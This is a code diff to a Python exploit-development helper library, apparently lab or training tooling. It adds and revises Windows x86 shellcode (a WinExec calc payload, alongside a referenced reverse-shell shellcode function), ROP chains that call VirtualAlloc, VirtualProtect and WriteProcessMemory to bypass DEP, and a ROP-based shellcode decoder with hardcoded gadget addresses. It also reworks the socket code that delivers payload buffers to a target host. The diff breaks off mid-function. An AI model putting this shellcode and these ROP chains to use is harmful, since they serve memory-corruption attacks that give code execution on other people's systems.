@@ -3,21 +3,24 @@ import sys
 from struct import pack, unpack
 import argparse
 import socket
-import os
 import traceback
 import time
-import binascii
 import ipaddress
+import select
 
 # Global vars
 host = None
 port = None
-timeout = None
 sock = None
 
 # Badchars
 badchars = [ 0x0 , 0xa, 0xd]  
 ropjunk = 0x60606060
+
+# Timeouts
+timeout = 5
+socktimeout = 30
+bufftimeout = 20
 
 class Colors:
     """ ANSI color codes """
@@ -157,41 +160,6 @@ class Helpers:
         coloredrp = ''.join(outrplines)      
 
         return coloredsc, coloredrp
-
-    def decodeShellcode(intbase, selectedsc, offsetDecoding):
-        # Loop over badchar indexes
-        restoreRop = []
-        replacements = Badchars.replacements
-        badIndices = Shellcode.mappedbadscchars
-        badchars_count = len(badchars)
-
-        for i in range(len(badIndices)):          
-            # Calculate offset from previous badchar to current
-            offset = badIndices[i] if i == 0 else badIndices[i] - badIndices[i - 1]
-            neg_offset = (-offset) & 0xffffffff
-            value = 0          
-                
-            # Iterate over every bad char & add offset to all of them  
-            value = next((replacements[j] for j in range(badchars_count) if selectedsc[badIndices[i]] == badchars[j]), 0)
-            
-            # ROP; program specific
-            # Value in BH to add; shift left 8 bits using OR
-            negoffsetDecoding = offsetDecoding & 0xff
-            value = ((value + negoffsetDecoding) << 8) | 0x11110011
-                
-            # ROP; program specific
-            restoreRop_gadgets = [
-                # get offset to next bad char into ecx
-                intbase + 0x117c,    # pop ecx ; ret
-                neg_offset,
-                # adjust eax by this offset to point to next bad char
-                intbase + 0x4a7b6,   # sub eax, ecx ; pop ebx ; ret
-                value,
-                intbase + 0x468ee,   # add [eax+1], bh ; ret
-            ]
-            restoreRop.extend(restoreRop_gadgets)
-
-        return restoreRop
     
     def encodeShellcode(sh,offsetEncoding):
         replacements = []
@@ -241,19 +209,33 @@ class Helpers:
             i=i+1
         return badIndex
 
-    def containsBadchars(hexaddr,checkhalf=False):
-        startchar = 2
-        endchar = 2
+    def containsBadchars(hexaddr, checkhalf=False):
+        """
+        Check if the 32-bit integer hex address contains any bad characters.
+        """
+        badchars = Badchars.programbadchars
+        addr_size = 4  # bytes
+        half_size = addr_size // 2  # 2 bytes
+        half_mask = (1 << (half_size * 8)) - 1  # 0xFFFF for 2 bytes
+
         if checkhalf == 'upper':
-            checkhex = hexaddr[:startchar]
+            # upper 2 bytes: shift right 16 bits, mask lower 16 bits
+            check_value = (hexaddr >> 16) & half_mask
+            length = half_size
         elif checkhalf == 'lower':
-            checkhex = hexaddr[endchar:]
+            # lower 2 bytes: mask lower 16 bits directly
+            check_value = hexaddr & half_mask
+            length = half_size
         else:
-            checkhex = hexaddr
-        strBadAddress = '0x' + binascii.hexlify(checkhex).decode('ascii')
-        for char in checkhex:
-            if char in badchars:
-                print("[-] Error: bad character " + str(char) + " in returned address " + str(strBadAddress))
+            # full 4 bytes
+            check_value = hexaddr
+            length = addr_size
+
+        for i in range(length):
+            shift = (length - 1 - i) * 8
+            b = (check_value >> shift) & 0xFF
+            if b in badchars:
+                print(f"[-] Error: bad character 0x{b:02x} in returned address 0x{hexaddr:08x}")
                 return True
         return False
 
@@ -289,9 +271,113 @@ class Helpers:
         return (val + (1 << nbits)) % (1 << nbits)
 
     def addhex(offset, nbits = 32):
+        """
+        Subtract/add enough bytes so hex address "loops" over ffffffff.
+        Negate and return the result
+        """
         largeVal = 0x88888888
         val = offset - largeVal
         return (val + (1 << nbits)) % (1 << nbits)
+
+    def append_hex(a, b):
+        """
+        "Append" hex bytes to an existing value. E.g. add 0x123 to 0x564, results in 0x564123
+        """
+        sizeof_b = 0
+
+        # get size of b in bits
+        while((b >> sizeof_b) > 0):
+            sizeof_b += 1
+
+        # align answer to nearest 4 bits (hex digit)
+        sizeof_b += sizeof_b % 4
+
+        return (a << sizeof_b) | b
+
+    def extract_and_accumulate_128bit_chunks(buffer,debug=False):
+        """
+        Simulates SIMD-like accumulation of 128-bit data chunks in an alternating pattern.
+        Used in SSE or AVX code when processing data in parallel registers (xmm).
+        """
+        def add_128bit_lanes(a: int, b: int) -> int:
+            # Convert to 16-byte little-endian
+            a_bytes = a.to_bytes(16, 'little')
+            b_bytes = b.to_bytes(16, 'little')
+            result = bytearray()
+            for i in range(0, 16, 4):
+                lane_a = int.from_bytes(a_bytes[i:i+4], 'little')
+                lane_b = int.from_bytes(b_bytes[i:i+4], 'little')
+                lane_sum = (lane_a + lane_b) & 0xFFFFFFFF
+                result += lane_sum.to_bytes(4, 'little')
+            return int.from_bytes(result, 'little')
+
+        startbit = 0x8
+        chunk_size = 0x10
+        num_chunks = (len(buffer) - startbit) // chunk_size
+
+        chunks = []
+        for i in range(num_chunks):
+            offset = startbit + i * chunk_size
+            part1 = int.from_bytes(buffer[offset:offset + startbit], 'little')
+            part2 = int.from_bytes(buffer[offset + startbit:offset + chunk_size], 'little')
+            full = (part2 << 64) | part1
+            chunks.append(full)
+
+        xmm2 = 0
+        xmm1 = 0
+
+        if debug:
+            print("=== Iteration Log ===")
+        for i, chunk in enumerate(chunks):
+            if i % 2 == 0:
+                xmm2 = add_128bit_lanes(xmm2, chunk)
+            else:
+                xmm1 = add_128bit_lanes(xmm1, chunk)
+
+            if debug:
+                print(f"XMM2: {xmm2.to_bytes(16, 'little')[::-1].hex()}")
+                print(f"XMM1: {xmm1.to_bytes(16, 'little')[::-1].hex()}")
+
+        print(f"Last XMM2: {xmm2.to_bytes(16, 'little')[::-1].hex()}")
+        print(f"Last XMM1: {xmm1.to_bytes(16, 'little')[::-1].hex()}")
+        return xmm2, xmm1
+
+    def calculate_checksum(xmm1: int, xmm2: int) -> int:
+        """
+        Simulates a series of SIMD (Single Instruction, Multiple Data) operations used in SSE instructions. 
+        It processes two 128-bit integers (xmm1 and xmm2) and returns a 32-bit checksum value.
+        """
+        def paddd(a: int, b: int) -> int:
+            # 32-bit lane-wise addition
+            a_bytes = a.to_bytes(16, 'little')
+            b_bytes = b.to_bytes(16, 'little')
+            result = bytearray()
+            for i in range(0, 16, 4):
+                lane_a = int.from_bytes(a_bytes[i:i+4], 'little')
+                lane_b = int.from_bytes(b_bytes[i:i+4], 'little')
+                lane_sum = (lane_a + lane_b) & 0xFFFFFFFF
+                result += lane_sum.to_bytes(4, 'little')
+            return int.from_bytes(result, 'little')
+
+        def psrldq(val: int, byte_shift: int) -> int:
+            # Logical right shift by N bytes
+            val_bytes = val.to_bytes(16, 'little')
+            shifted = val_bytes[byte_shift:] + b'\x00' * byte_shift
+            return int.from_bytes(shifted, 'little')
+
+        # Perform the sequence
+        xmm1 = paddd(xmm1, xmm2)           # xmm1 += xmm2
+        xmm0 = xmm1                        # xmm0 = xmm1
+        xmm0 = psrldq(xmm0, 8)             # shift right by 8 bytes
+        xmm1 = paddd(xmm1, xmm0)           # xmm1 += shifted xmm0
+        xmm0 = xmm1
+        xmm0 = psrldq(xmm0, 4)             # shift right by 4 bytes
+        xmm1 = paddd(xmm1, xmm0)           # final add
+
+        # Extract lowest 32 bits and XOR with static value in code
+        checksum = (xmm1 & 0xffffffff) ^ 0x592AF351
+
+        return checksum
 
     def keyboard_interrupt():
         """Handles keyboardinterrupt exceptions"""""
@@ -347,6 +433,39 @@ class Badchars:
             b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
             b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
         return chars
+    
+    def custombadchars():
+        # Not including "\x0a\x0d\x00\x25\x26\x27\x2b" 
+        chars = (
+            b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
+            b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+            b"\x21\x22\x23\x24\x28\x29\x2a\x2c\x2d\x2e\x2f\x30"
+            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+            b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+            b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+            b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+            b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+            b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+            b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+            b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+            b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
+        return chars    
+        
+    def asciiprintchars():
+        # Printable ASCII characters
+        chars = (
+            b"\x20"
+            b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f")
+        return chars    
     
 class Shellcode:
     def asmrevshellShellcode(revip,revport):
@@ -758,86 +877,74 @@ class Shellcode:
         return shellcode
 
     def asmcalcShellcode():
-        # Source from: https://github.com/hodor-sec/Shellcoding/blob/master/shellcode/asm/calc/win_x86_winexec_calc_pic.asm
-        # Payload size: 201 bytes
+        # Source from: https://github.com/peterferrie/win-exec-calc-shellcode/tree/master
+        # Compiled using;
+        # $ nasm -f win32 -o win-exec-calc-shellcode.o win-exec-calc-shellcode.asm
+        # $ ld -m i386pe -o win-exec-calc-shellcode.bin win-exec-calc-shellcode.o
+        # Payload size: 127 bytes
         shellcode = (
-                b"\x89\xe5"                             # 0   / 0x0              mov ebp, esp
-                b"\x81\xc4\xf0\xf9\xff\xff"             # 2   / 0x2              add esp, 0xfffff9f0
-                b"\x31\xc9"                             # 8   / 0x8              xor ecx, ecx
-                b"\x64\x8b\x71\x30"                     # 10  / 0xa              mov esi, dword ptr fs:[ecx + 0x30]
-                b"\x8b\x76\x0c"                         # 14  / 0xe              mov esi, dword ptr [esi + 0xc]
-                b"\x8b\x76\x1c"                         # 17  / 0x11             mov esi, dword ptr [esi + 0x1c]
-                b"\x8b\x5e\x08"                         # 20  / 0x14             mov ebx, dword ptr [esi + 8]
-                b"\x8b\x7e\x20"                         # 23  / 0x17             mov edi, dword ptr [esi + 0x20]
-                b"\x8b\x36"                             # 26  / 0x1a             mov esi, dword ptr [esi]
-                b"\x66\x39\x4f\x18"                     # 28  / 0x1c             cmp word ptr [edi + 0x18], cx
-                b"\x75\xf2"                             # 32  / 0x20             jne 0x14
-                b"\xeb\x06"                             # 34  / 0x22             jmp 0x2a
-                b"\x5e"                                 # 36  / 0x24             pop esi
-                b"\x89\x75\x04"                         # 37  / 0x25             mov dword ptr [ebp + 4], esi
-                b"\xeb\x54"                             # 40  / 0x28             jmp 0x7e
-                b"\xe8\xf5\xff\xff\xff"                 # 42  / 0x2a             call 0x24
-                b"\x60"                                 # 47  / 0x2f             pushal
-                b"\x8b\x43\x3c"                         # 48  / 0x30             mov eax, dword ptr [ebx + 0x3c]
-                b"\x8b\x7c\x03\x78"                     # 51  / 0x33             mov edi, dword ptr [ebx + eax + 0x78]
-                b"\x01\xdf"                             # 55  / 0x37             add edi, ebx
-                b"\x8b\x4f\x18"                         # 57  / 0x39             mov ecx, dword ptr [edi + 0x18]
-                b"\x8b\x47\x20"                         # 60  / 0x3c             mov eax, dword ptr [edi + 0x20]
-                b"\x01\xd8"                             # 63  / 0x3f             add eax, ebx
-                b"\x89\x45\xfc"                         # 65  / 0x41             mov dword ptr [ebp - 4], eax
-                b"\xe3\x36"                             # 68  / 0x44             jecxz 0x7c
-                b"\x49"                                 # 70  / 0x46             dec ecx
-                b"\x8b\x45\xfc"                         # 71  / 0x47             mov eax, dword ptr [ebp - 4]
-                b"\x8b\x34\x88"                         # 74  / 0x4a             mov esi, dword ptr [eax + ecx*4]
-                b"\x01\xde"                             # 77  / 0x4d             add esi, ebx
-                b"\x31\xc0"                             # 79  / 0x4f             xor eax, eax
-                b"\x99"                                 # 81  / 0x51             cdq
-                b"\xfc"                                 # 82  / 0x52             cld
-                b"\xac"                                 # 83  / 0x53             lodsb al, byte ptr [esi]
-                b"\x84\xc0"                             # 84  / 0x54             test al, al
-                b"\x74\x07"                             # 86  / 0x56             je 0x5f
-                b"\xc1\xca\x0d"                         # 88  / 0x58             ror edx, 0xd
-                b"\x01\xc2"                             # 91  / 0x5b             add edx, eax
-                b"\xeb\xf4"                             # 93  / 0x5d             jmp 0x53
-                b"\x3b\x54\x24\x24"                     # 95  / 0x5f             cmp edx, dword ptr [esp + 0x24]
-                b"\x75\xdf"                             # 99  / 0x63             jne 0x44
-                b"\x8b\x57\x24"                         # 101 / 0x65             mov edx, dword ptr [edi + 0x24]
-                b"\x01\xda"                             # 104 / 0x68             add edx, ebx
-                b"\x66\x8b\x0c\x4a"                     # 106 / 0x6a             mov cx, word ptr [edx + ecx*2]
-                b"\x8b\x57\x1c"                         # 110 / 0x6e             mov edx, dword ptr [edi + 0x1c]
-                b"\x01\xda"                             # 113 / 0x71             add edx, ebx
-                b"\x8b\x04\x8a"                         # 115 / 0x73             mov eax, dword ptr [edx + ecx*4]
-                b"\x01\xd8"                             # 118 / 0x76             add eax, ebx
-                b"\x89\x44\x24\x1c"                     # 120 / 0x78             mov dword ptr [esp + 0x1c], eax
-                b"\x61"                                 # 124 / 0x7c             popal
-                b"\xc3"                                 # 125 / 0x7d             ret
-                b"\x68\x83\xb9\xb5\x78"                 # 126 / 0x7e             push 0x78b5b983
-                b"\xff\x55\x04"                         # 131 / 0x83             call dword ptr [ebp + 4]
-                b"\x89\x45\x10"                         # 134 / 0x86             mov dword ptr [ebp + 0x10], eax
-                b"\x68\x66\x19\xda\x75"                 # 137 / 0x89             push 0x75da1966
-                b"\xff\x55\x04"                         # 142 / 0x8e             call dword ptr [ebp + 4]
-                b"\x89\x45\x14"                         # 145 / 0x91             mov dword ptr [ebp + 0x14], eax
-                b"\x68\x8e\x4e\x0e\xec"                 # 148 / 0x94             push 0xec0e4e8e
-                b"\xff\x55\x04"                         # 153 / 0x99             call dword ptr [ebp + 4]
-                b"\x89\x45\x18"                         # 156 / 0x9c             mov dword ptr [ebp + 0x18], eax
-                b"\x68\x98\xfe\x8a\x0e"                 # 159 / 0x9f             push 0xe8afe98
-                b"\xff\x55\x04"                         # 164 / 0xa4             call dword ptr [ebp + 4]
-                b"\x89\x45\x1c"                         # 167 / 0xa7             mov dword ptr [ebp + 0x1c], eax
-                b"\xeb\x03"                             # 170 / 0xaa             jmp 0xaf
-                b"\xff\x55\x14"                         # 172 / 0xac             call dword ptr [ebp + 0x14]
-                b"\x31\xc0"                             # 175 / 0xaf             xor eax, eax
-                b"\x40"                                 # 177 / 0xb1             inc eax
-                b"\x50"                                 # 178 / 0xb2             push eax
-                b"\x48"                                 # 179 / 0xb3             dec eax
-                b"\x66\x50"                             # 180 / 0xb4             push ax
-                b"\x68\x63\x61\x6c\x63"                 # 182 / 0xb6             push 0x636c6163
-                b"\x89\xe3"                             # 187 / 0xbb             mov ebx, esp
-                b"\x53"                                 # 189 / 0xbd             push ebx
-                b"\xff\x55\x1c"                         # 190 / 0xbe             call dword ptr [ebp + 0x1c]
-                b"\x31\xc9"                             # 193 / 0xc1             xor ecx, ecx
-                b"\x51"                                 # 195 / 0xc3             push ecx
-                b"\x6a\xff"                             # 196 / 0xc4             push -1
-                b"\xff\x55\x10"                         # 198 / 0xc6             call dword ptr [ebp + 0x10]
+                b"\x31\xc0"                        # 0x0         xor  eax, eax
+                b"\x50"                            # 0x2         push eax
+                b"\x68\x63\x61\x6c\x63"            # 0x3         push 0x636c6163
+                b"\x54"                            # 0x8         push esp
+                b"\x59"                            # 0x9         pop  ecx
+                b"\x50"                            # 0x10        push eax
+                b"\x40"                            # 0x11        inc  eax
+                b"\x92"                            # 0x12        xchg eax, edx
+                b"\x74\x15"                        # 0x13        je   0x24
+                b"\x51"                            # 0x15        push ecx
+                b"\x64\x8b\x72\x2f"                # 0x16        mov  esi, dword ptr fs:[edx + 0x2f]
+                b"\x8b\x76\x0c"                    # 0x20        mov  esi, dword ptr [esi + 0xc]
+                b"\x8b\x76\x0c"                    # 0x23        mov  esi, dword ptr [esi + 0xc]
+                b"\xad"                            # 0x26        lodsdeax, dword ptr [esi]
+                b"\x8b\x30"                        # 0x27        mov  esi, dword ptr [eax]
+                b"\x8b\x7e\x18"                    # 0x29        mov  edi, dword ptr [esi + 0x18]
+                b"\xb2\x50"                        # 0x32        mov  dl, 0x50
+                b"\xeb\x1a"                        # 0x34        jmp  0x3e
+                b"\xb2\x60"                        # 0x36        mov  dl, 0x60
+                b"\x48"                            # 0x38        dec  eax
+                b"\x29\xd4"                        # 0x39        sub  esp, edx
+                b"\x65\x48"                        # 0x41        dec  eax
+                b"\x8b\x32"                        # 0x43        mov  esi, dword ptr [edx]
+                b"\x48"                            # 0x45        dec  eax
+                b"\x8b\x76\x18"                    # 0x46        mov  esi, dword ptr [esi + 0x18]
+                b"\x48"                            # 0x49        dec  eax
+                b"\x8b\x76\x10"                    # 0x50        mov  esi, dword ptr [esi + 0x10]
+                b"\x48"                            # 0x53        dec  eax
+                b"\xad"                            # 0x54        lodsdeax, dword ptr [esi]
+                b"\x48"                            # 0x55        dec  eax
+                b"\x8b\x30"                        # 0x56        mov  esi, dword ptr [eax]
+                b"\x48"                            # 0x58        dec  eax
+                b"\x8b\x7e\x30"                    # 0x59        mov  edi, dword ptr [esi + 0x30]
+                b"\x03\x57\x3c"                    # 0x62        add  edx, dword ptr [edi + 0x3c]
+                b"\x8b\x5c\x17\x28"                # 0x65        mov  ebx, dword ptr [edi + edx + 0x28]
+                b"\x8b\x74\x1f\x20"                # 0x69        mov  esi, dword ptr [edi + ebx + 0x20]
+                b"\x48"                            # 0x73        dec  eax
+                b"\x01\xfe"                        # 0x74        add  esi, edi
+                b"\x8b\x54\x1f\x24"                # 0x76        mov  edx, dword ptr [edi + ebx + 0x24]
+                b"\x0f\xb7\x2c\x17"                # 0x80        movzxebp, word ptr [edi + edx]
+                b"\x8d\x52\x02"                    # 0x84        lea  edx, [edx + 2]
+                b"\xad"                            # 0x87        lodsdeax, dword ptr [esi]
+                b"\x81\x3c\x07\x57\x69\x6e\x45"    # 0x88        cmp  dword ptr [edi + eax], 0x456e6957
+                b"\x75\xef"                        # 0x95        jne  0x50
+                b"\x8b\x74\x1f\x1c"                # 0x97        mov  esi, dword ptr [edi + ebx + 0x1c]
+                b"\x48"                            # 0x101       dec  eax
+                b"\x01\xfe"                        # 0x102       add  esi, edi
+                b"\x8b\x34\xae"                    # 0x104       mov  esi, dword ptr [esi + ebp*4]
+                b"\x48"                            # 0x107       dec  eax
+                b"\x01\xf7"                        # 0x108       add  edi, esi
+                b"\x99"                            # 0x110       cdq
+                b"\xff\xd7"                        # 0x111       call edi
+                b"\xff"                            # 0x113       db   0xff
+                b"\xff"                            # 0x114       db   0xff
+                b"\xff"                            # 0x115       db   0xff
+                b"\xff\x00"                        # 0x116       inc  dword ptr [eax]
+                b"\x00\x00"                        # 0x118       add  byte ptr [eax], al
+                b"\xff"                            # 0x120       db   0xff
+                b"\xff"                            # 0x121       db   0xff
+                b"\xff"                            # 0x122       db   0xff
+                b"\xff\x00"                        # 0x123       inc  dword ptr [eax]
+                b"\x00\x00"                        # 0x125       add  byte ptr [eax], al
         )
         return shellcode
 
@@ -965,12 +1072,12 @@ class ROP:
         ]
         return rop_skel_gadgets 
 
-    def chainWriteProcessMemory(intbaselib,payloadoffsetsc,ropskeloffsetlpbuf,ropdecoderoffseteax):
+    def chainWriteProcessMemory(intbaselib_dll=False,payloadoffsets=False,ropskeloffsetlpbuf=False,ropdecoderoffseteax=False):
         rop_chain1_gadgets = [
             ### ESP Alignment ###
             # Save current ESP in ESI and EAX
             ropjunk,                                            # Filler
-            intbaselib + 0x408d6,                               # push esp ; pop esi ; ret ;
+            intbaselib_dll + 0x408d6,                               # push esp ; pop esi ; ret ;
             
             # Patch lpBuffer in ROP skeleton
 
@@ -985,7 +1092,7 @@ class ROP:
         ]
         return rop_chain1_gadgets
 
-    def chainVirtualAlloc(intbaselib,offsetwritable,offsetk32heapfree,offsetk32va,ropskelfuncOffset,ropskelscOffset,ropskeleaxscOffset):
+    def chainVirtualAlloc(intbaselib_dll,offsetwritable,offsetk32heapfree,offsetk32va,ropskelfuncOffset,ropskelscOffset,ropskeleaxscOffset):
         # Optionally; PUSHAD GOALS
         # EAX ???????? => &Kernel32!VirtualAlloc
         # EBX 00000001 => dwSize
@@ -996,6 +1103,16 @@ class ROP:
         # ESI ???????? => JMP [EAX]
         # EDI ???????? => RETNOP
         #
+        # Optionally; PUSHAD GOALS; alternative
+        # EAX = Called after VA completed
+        # EBX = dwSize (0x01)
+        # ECX = flProtect (0x40)
+        # EDX = flAllocationType (0x1000)
+        # ESP = lpAddress (automatic)
+        # EBP = ReturnTo (stack pivot into a rop nop / jmp esp)
+        # ESI = ptr to VirtualAlloc()
+        # EDI = ROP NOP (RETN)
+        
         rop_chain1_gadgets = [
             ### Future usage ###
             # Clear ESI for future usage
@@ -1064,7 +1181,7 @@ class ROP:
         ]
         return rop_chain1_gadgets
 
-    def chainVirtualProtect(intbaselib,intptrk32vp,ropskelfuncOffset,ropskelscOffset,ropskeloldProtect,ropskeleaxscOffset):
+    def chainVirtualProtect(intbaselib_dll,intptrk32vp,ropskelfuncOffset,ropskelscOffset,ropskeloldProtect,ropskeleaxscOffset):
         # Optionally; PUSHAD GOALS
         # EDI - Ptr to RETN
         # ESI - VirtualProtect()
@@ -1078,7 +1195,7 @@ class ROP:
         rop_chain1_gadgets = [
             ### ESP Alignment ###
             # Save current ESP in xxx
-            intbaselib + 0x0,
+            intbaselib_dll + 0x0,
             # Use add method for EAX to calculate offset
 
             ### VirtualProtect address ###
@@ -1109,11 +1226,54 @@ class ROP:
         ]
         return rop_chain1_gadgets
 
-    def chainscDecoder(intbaselib,encodedsc,offsetDecoding):
-        rop_chainscDecoder_gadgets = Helpers.decodeShellcode(intbaselib,encodedsc,offsetDecoding)
-        return rop_chainscDecoder_gadgets  
+    def chainscDecoder(encodedsc,offsetDecoding):
+        # Loop over badchar indexes
+        restoreRop = []
+        replacements = Badchars.replacements
+        badIndices = Shellcode.mappedbadscchars
+        badchars_count = len(badchars)
 
-    def chainropskelAlign(intbaselib,ropskelalign,offsetwritable=False):
+        for i in range(len(badIndices)):          
+            # Calculate offset from previous badchar to current
+            offset = badIndices[i] if i == 0 else badIndices[i] - badIndices[i - 1]
+            # Negate; include offset of +1 using in 'add' ROP below
+            neg_offset = (-offset) & 0xffffffff
+            value = 0          
+                
+            # Iterate over every bad char & add offset to all of them  
+            value = next((replacements[j] for j in range(badchars_count) if encodedsc[badIndices[i]] == badchars[j]), 0)
+            # ROP; program specific
+            negoffsetDecoding = offsetDecoding & 0xffffffff
+            neg_value = (value + negoffsetDecoding)
+            
+            # ROP; ALT
+            # Value in BH to add; shift left 8 bits using OR
+            #negoffsetDecoding = offsetDecoding & 0xff
+            #value = ((value + negoffsetDecoding) << 8) | 0x11110011
+            
+            # ROP; program specific
+            restoreRop_gadgets = [
+                # Get offset to next bad char into ecx
+                0x10022fd8,                             # pop ecx ; ret ; 
+                neg_offset,
+                # Adjust eax by this offset to point to next bad char
+                0x1001283e,                             # sub eax, ecx ; ret ;   
+                0x1001614d,                             # dec eax ; ret ;
+                0x61c0a798,                             # xchg eax, edi ; ret ;
+                # Decode character
+                0x10015442,                             # pop eax ; ret ;   
+                neg_value,
+                0x61c0a798,                             # xchg eax, edi ; ret ;
+                0x1001c0b2,                             # add  [eax+0x00000001], edi ; pop edi ; pop esi ; pop ebp ; pop ebx ; ret ;
+                ropjunk,
+                ropjunk,
+                ropjunk,
+                ropjunk,
+            ]
+            restoreRop.extend(restoreRop_gadgets)
+        return restoreRop
+
+    def chainropskelAlign(intbaselib_dll=False):
         rop_chainropskelAlign_gadgets = [
             ### Align EAX with shellcode ###
             # Save current ESP in EAX
@@ -1123,7 +1283,7 @@ class ROP:
         ]
         return rop_chainropskelAlign_gadgets
 
-    def ropespAlign(offsetesp):
+    def chainropespAlign(offsetesp):
         rop_espalign_gadgets = [
             0x66aca8,                               # push esp ; sub eax, 0x20 ; pop ebx ; ret ;
             0x667a0d,                               # mov eax, ebx ; pop esi ; pop ebx ; ret ;
@@ -1163,190 +1323,362 @@ class Network:
             return sock
 
         # Use or create global TCP socket; send and buffered receive
-        def sendrecvsocktcp(buffer, recvsize=1024, recvbuffered=False, sendall=False, keepopen=True):
+        def sendrecvsocktcp(
+            buffer,
+            recvsize=1024,
+            max_buffer=1024,
+            recvbuffered=False,
+            sendall=False,
+            keepopen=True,
+            timeout=socktimeout,
+            buffer_timeout=bufftimeout,
+            debug=False
+        ):
             global sock
             try:
-                # Check if the socket is open, otherwise create a new one
+                # Ensure socket is open
                 if not (sock and sock.fileno() != -1):
-                    print("[!] Socket not open, reopening...")
-                    Network.TCP.creategsocktcp(host, port)  # Reinitialize the socket if needed
+                    if debug:
+                        print("[!] Socket not open, reopening...")
+                    Network.TCP.creategsocktcp(host, port)
+
+                sock.settimeout(timeout)
+                if debug:
+                    print(f"[*] Socket timeout set to {timeout} seconds.")
+
                 # Send data
                 if sendall:
                     sock.sendall(buffer)
+                    if debug:
+                        print(f"[✓] Sent {len(buffer)} / {hex(len(buffer))} bytes using sendall().")
                 else:
-                    sock.send(buffer)
-                # Receive buffered data
+                    sent = sock.send(buffer)
+                    if debug:
+                        print(f"[✓] Sent {sent} / {hex(sent)} bytes using send().")
+
+                # Buffered receive with max_buffer logic
                 if recvbuffered:
-                    chunksize = 0
                     resp = b""
-                    # Receive initial response and response size
-                    initresp = sock.recv(recvsize)
-                    respsize = len(initresp)
-                    print(f"Received initial size data: {hex(respsize)}")
-                    try:
-                        #respsize = len(initresp)
-                        print(f"[*] The read/write size returned: {hex(respsize)} bytes")
-                    except ValueError:
-                        print("[!] Error parsing the response size")
-                        return None
-                    # Continuously receive chunks until the full response is received
-                    while chunksize < respsize:
-                        chunk = sock.recv(respsize - chunksize)
-                        if not chunk:  # Handle case where no data is received (e.g., connection closed)
-                            print("[!] Socket closed or no data received.")
+                    total_received = 0
+                    chunk_num = 1
+                    if debug:
+                        print(f"[*] Starting buffered receive (timeout={buffer_timeout}s, max_buffer={max_buffer})")
+
+                    while True:
+                        if max_buffer is not None and total_received >= max_buffer:
+                            if debug:
+                                print(f"[✓] Maximum buffer size {max_buffer} bytes reached. Stopping receive.")
                             break
-                        chunksize += len(chunk)
-                        resp += chunk
-                    # Return the response and close socket if required
-                    return resp if keepopen else (resp, sock.close())
-                # Receive unbuffered data
-                else:
-                    resp = sock.recv(recvsize)
+
+                        rlist, _, _ = select.select([sock], [], [], buffer_timeout)
+                        if rlist:
+                            try:
+                                remaining = max_buffer - total_received if max_buffer is not None else recvsize
+                                read_size = min(recvsize, remaining)
+
+                                if read_size <= 0:
+                                    if debug:
+                                        print(f"[✓] Remaining buffer limit reached (0 bytes left).")
+                                    break
+
+                                chunk = sock.recv(read_size)
+
+                                if not chunk:
+                                    if debug:
+                                        print(f"[!] Connection closed by peer. Total received: {total_received} / {hex(total_received)} bytes.")
+                                    break
+
+                                chunk_len = len(chunk)
+                                resp += chunk
+                                total_received += chunk_len
+                                if debug:
+                                    print(f"[Chunk {chunk_num}] Received {chunk_len} / {hex(chunk_len)} bytes (Total: {total_received} / {hex(total_received)})")
+                                if chunk_len < recvsize:
+                                    break
+                                chunk_num += 1
+
+                            except socket.timeout:
+                                if debug:
+                                    print(f"[!] Socket recv() timeout.")
+                                break
+                        else:
+                            if debug:
+                                print(f"[!] Buffer timeout of {buffer_timeout}s hit. Stopping receive.")
+                            break
+
                     if not keepopen:
                         sock.close()
                     return resp
+
+                # Unbuffered single receive
+                else:
+                    resp = sock.recv(recvsize)
+                    if debug:
+                        print(f"[Unbuffered] Received {len(resp)} / {hex(len(resp))} bytes")
+                    if not keepopen:
+                        sock.close()
+                    return resp
+
             except socket.timeout:
-                print("[!] Socket timeout.")
+                if debug:
+                    print("[!] Socket connection-level timeout.")
                 if not keepopen:
                     sock.close()
                 sys.exit(0)
-            except Exception as e:
-                print(f"[!] Error: {e}")
-                traceback.print_exc()
-                if sock:
-                    sock.close()
-                sys.exit(0)
+
             except KeyboardInterrupt:
